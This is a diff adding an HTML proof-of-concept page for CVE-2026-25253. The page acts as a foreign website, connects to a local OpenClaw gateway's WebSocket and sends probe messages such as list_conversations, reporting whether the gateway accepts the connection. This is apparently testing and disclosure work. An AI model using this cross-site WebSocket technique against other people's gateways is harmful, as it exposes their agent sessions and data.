@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>OpenClaw WebSocket Origin Test</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, monospace;
+    background: #1a1b2e;
+    color: #e0e0f0;
+    max-width: 700px;
+    margin: 2rem auto;
+    padding: 2rem;
+  }
+  h1 { font-size: 1.4rem; }
+  .log { background: #252640; padding: 1rem; border-radius: 8px; margin: 1rem 0; min-height: 100px; }
+  .log p { margin: 0.3rem 0; font-size: 0.85rem; word-break: break-all; }
+  .ok { color: #44dd88; }
+  .fail { color: #ff4d6a; }
+  .warn { color: #ffaa33; }
+  .info { color: #44aaff; }
+  #status {
+    font-size: 1.2rem;
+    font-weight: bold;
+    padding: 1rem;
+    border-radius: 8px;
+    margin: 1rem 0;
+    text-align: center;
+  }
+  .vulnerable { background: #ff4d6a22; border: 2px solid #ff4d6a; color: #ff4d6a; }
+  .safe { background: #44dd8822; border: 2px solid #44dd88; color: #44dd88; }
+  .unknown { background: #ffaa3322; border: 2px solid #ffaa33; color: #ffaa33; }
+  .data-box {
+    background: #1a1b2e;
+    border: 1px solid #3a3b5a;
+    padding: 1rem;
+    border-radius: 4px;
+    margin: 0.5rem 0;
+    white-space: pre-wrap;
+    font-size: 0.8rem;
+    max-height: 300px;
+    overflow-y: auto;
+  }
+</style>
+</head>
+<body>
+
+<h1>CVE-2026-25253: WebSocket Origin Validation Test</h1>
+<p class="info">This page simulates a malicious website connecting to the local
+OpenClaw gateway. It is hosted on an EXTERNAL server but reaches into
+localhost:18789 via the browser.</p>
+
+<div id="status" class="unknown">Testing...</div>
+
+<h3>Connection Log</h3>
+<div class="log" id="log"></div>
+
+<h3>Data Received from Gateway</h3>
+<div class="data-box" id="data">Waiting...</div>
+
+<script>
+const log = document.getElementById('log');
+const dataBox = document.getElementById('data');
+const status = document.getElementById('status');
+const GATEWAY = 'ws://127.0.0.1:18789';
+let messageCount = 0;
+
+function addLog(msg, cls) {
+  const p = document.createElement('p');
+  p.className = cls || 'info';
+  p.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+  log.appendChild(p);
+  log.scrollTop = log.scrollHeight;
+}
+
+function addData(msg) {
+  if (messageCount === 0) dataBox.textContent = '';
+  messageCount++;
+  dataBox.textContent += '[Message ' + messageCount + '] ' + msg + '\n\n';
+  dataBox.scrollTop = dataBox.scrollHeight;
+}
+
+function runTest() {
+  addLog('Page origin: ' + window.location.origin);
+  addLog('This is ' + (window.location.protocol === 'file:' ? 'a LOCAL file' : 'an EXTERNAL site'));
+  addLog('Connecting to ' + GATEWAY + '...');
+
+  var ws;
+  try {
+    ws = new WebSocket(GATEWAY);
+  } catch (e) {
+    addLog('WebSocket blocked: ' + e.message, 'ok');
+    status.textContent = 'SAFE - Browser blocked the connection';
+    status.className = 'safe';
+    return;
+  }
+
+  var timeout = setTimeout(function() {
+    addLog('Timed out after 5s', 'warn');
+    status.textContent = 'UNKNOWN - Gateway may not be running';
+    status.className = 'unknown';
+    ws.close();
+  }, 5000);
+
+  ws.onopen = function() {
+    clearTimeout(timeout);
+    addLog('CONNECTION ESTABLISHED from foreign origin!', 'fail');
+    addLog('The gateway did not check where this request came from.', 'fail');
+
+    status.textContent = 'VULNERABLE - Connection accepted from ' + window.location.origin;
+    status.className = 'vulnerable';
+
+    // Listen for anything the gateway sends us
+    addLog('Listening for gateway messages...', 'warn');
+
+    // Try common OpenClaw gateway protocol messages
+    // These are read-only probes to see what the gateway responds with
+    var probes = [
+      '{"type":"ping"}',
+      '{"method":"status","id":1}',
+      '{"action":"list_conversations","id":2}',
+      '{"type":"subscribe","channel":"agent"}',
+    ];
+
+    for (var i = 0; i < probes.length; i++) {
+      try {
+        ws.send(probes[i]);
+        addLog('Sent probe: ' + probes[i], 'warn');
+      } catch (e) {
+        addLog('Send failed: ' + e.message, 'info');
+      }
+    }
+
+    // Keep connection open for 10s to collect responses
+    setTimeout(function() {
+      addLog('Test complete. Closing connection.', 'info');
+      if (messageCount === 0) {
+        addLog('No messages received, but connection WAS accepted.', 'fail');
+        addLog('An attacker with knowledge of the protocol could send commands.', 'fail');
+      } else {
+        addLog(messageCount + ' messages received from gateway!', 'fail');
+      }
+      ws.close();
+    }, 10000);
+  };
+
+  ws.onmessage = function(event) {
+    addLog('RECEIVED DATA from gateway!', 'fail');
+    var text = typeof event.data === 'string' ? event.data : '[binary data]';
+    addData(text);
+  };
+
+  ws.onerror = function() {
+    clearTimeout(timeout);
+    addLog('Connection rejected or failed.', 'ok');
+    status.textContent = 'SAFE - Gateway rejected the connection';
+    status.className = 'safe';
+    dataBox.textContent = 'No data - connection was blocked.';
+  };
+
+  ws.onclose = function(e) {
+    clearTimeout(timeout);
+    if (e.code !== 1000 && status.className.indexOf('vulnerable') === -1) {
+      addLog('Closed: code=' + e.code + ' reason=' + (e.reason || 'none'), 'warn');
+    }
+  };
+}
+
+runTest();
+</script>
+
+</body>
+</html>
